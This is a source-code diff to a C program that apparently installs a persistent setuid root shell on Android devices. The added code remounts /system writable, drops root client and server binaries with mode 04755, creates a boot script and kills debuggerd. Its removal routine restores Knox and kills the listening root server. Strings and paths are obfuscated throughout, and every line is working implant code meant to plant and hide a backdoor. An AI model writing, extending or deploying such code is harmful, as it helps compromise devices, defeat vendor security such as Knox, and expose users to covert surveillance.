@@ -46,6 +46,7 @@ static void my_chown(char *user, char *group, char *file);
 static void my_chmod(const char *mode, const char *file);
 static void add_admin(const char *appname);
 static void copy_root(const char *mntpnt, const char *src, const char *dst);
+static void copy_root_no_mount(const char *src, const char *dst);
 static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
 static int search_content(const char *content, const char *file);
@@ -182,24 +183,35 @@ int exec_cmd(int argc, char** argv) {
 		  }
 		}
 		  
+		// Mount /system as rw
+		remount(deobfuscate(system3), 0);
 
 		// Install the new shell
-		copy_root(deobfuscate(system3), argv[0], deobfuscate(ROOT_CLIENT));  // root client
-		copy_root(deobfuscate(system3), argv[0], deobfuscate(ROOT_SERVER)); // server
+		copy_root_no_mount(argv[0], deobfuscate(ROOT_CLIENT));  // root client
+		copy_root_no_mount(argv[0], deobfuscate(ROOT_SERVER)); // server
 		createBootScript();
 
-		//if(!fork()) {
-		//execl(deobfuscate(ROOT_SERVER), deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt), NULL);
-		//}
 		kill_debuggerd();
 		sleep(2);
 
+		// Mount as read-only
+		remount(deobfuscate(system3), MS_RDONLY);
+
 	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root
+	        // Mount /system as rw
+		remount(deobfuscate(system3), 0);
+
 	        // Remove and restore the proper boot script and rilcap
 	        removeBootScript();
 
       		// Restore knox if present
 		restore_knox();
+		
+		// Mount /system as ro
+		remount(deobfuscate(system3), MS_RDONLY);		
+
+		// Restart debuggerd
+		kill_debuggerd();
 
 		// kill the root server process (we need to kill the listening child)
 		LOGD("Killing server %d\n", (int) server_pid);
@@ -460,6 +472,13 @@ static void copy_root(const char *mntpnt, const char *src, const char *dst) {
 
 	if (mntpnt != NULL)
 		remount(mntpnt, MS_RDONLY);
+}
+
+static void copy_root_no_mount(const char *src, const char *dst) {
+
+	copy(src, dst);
+	chown(dst, 0, 0);
+	chmod(dst, 04755);
 }
 
 static void copy_remount(const char *mntpnt, const char *src, const char *dst) {
